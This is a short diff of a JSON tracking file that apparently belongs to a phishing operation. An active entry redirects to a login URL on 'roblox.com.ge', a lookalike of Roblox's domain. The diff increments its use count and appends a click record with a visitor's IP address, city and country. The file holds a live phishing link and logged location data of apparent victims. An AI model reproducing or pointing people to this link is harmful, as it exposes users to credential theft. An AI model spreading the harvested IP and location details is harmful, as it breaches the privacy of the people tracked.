@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1225,
+    "useCount": 1226,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9944,6 +9944,14 @@
         "city": "La Guaira",
         "flag": "🇻🇪",
         "countryCode": "VE"
+      },
+      {
+        "timestamp": 1777318194136,
+        "ip": "83.105.75.81",
+        "country": "United Kingdom",
+        "city": "Farnborough",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
